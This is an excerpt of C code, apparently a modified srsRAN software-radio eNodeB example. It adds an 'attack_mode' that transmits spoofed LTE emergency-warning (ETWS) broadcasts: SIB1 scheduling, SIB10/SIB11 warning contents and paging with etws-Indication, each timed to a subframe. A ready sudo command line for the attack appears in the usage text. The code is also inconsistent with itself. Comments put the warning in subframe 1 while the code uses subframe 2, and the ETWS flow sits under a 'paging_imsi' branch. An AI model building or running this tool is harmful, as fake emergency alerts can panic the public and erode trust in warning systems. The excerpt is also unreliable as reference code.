...
char buffer[PATH_MAX];  // 使用系统标准路径长度
 ...
 static void usage(char* prog)
 {
   ...
   printf("\tetws_complete: \n\t sudo ./lib/examples/pdsch_enodeb -I UHD -x 1 -a type=x300 -g 30 -c 420 --type sib10_sib11_etws\n");
 }
            ...
            case 't': {
              attack_mode = optarg;
                if (strcmp(attack_mode, "paging_imsi") == 0) {
                    ...
                    /* Complete ETWS flow:
                     *   SF1: SIB10/SIB11 warning contents on SI-RNTI
                     *   SF5: SIB1 with schedulingInfoList for SIB10/SIB11
                     *   SF9: Paging with etws-Indication on P-RNTI
                     */
                    etws_si_msg = true;
                    sib1_msg = true;
                    paging_msg = true;
                    sib1_file_name = "sib1_etws_sched_sf5.fc32";
                    etws_si_file_name = "sib10_sib11_etws_sf2.fc32";
                    paging_file_name = "paging_etws_sf9.fc32";
                }
 ...
 static void* tx_thread_func() {
   ...
   while (!go_exit) {
     ...
     if (cur_rx_ret == 0 && cur_sfn >= 0) {
       ...
       int ret = -1;
       if (etws_si_msg) {
        /* ETWS SI is scheduled in the SIB1 ETWS scheduling entry for subframe 1. */
        target_tti = 2;
        ...
        if (sib1_msg) {
          /* For sib10_sib11_etws, this is the SIB1 that advertises SIB10/SIB11 in SF1. */
          target_tti = 5;
          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
        ...
        if (paging_msg) {
          /* Paging carries etws-Indication, prompting the UE to refresh SI. */
          target_tti = 9;
          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
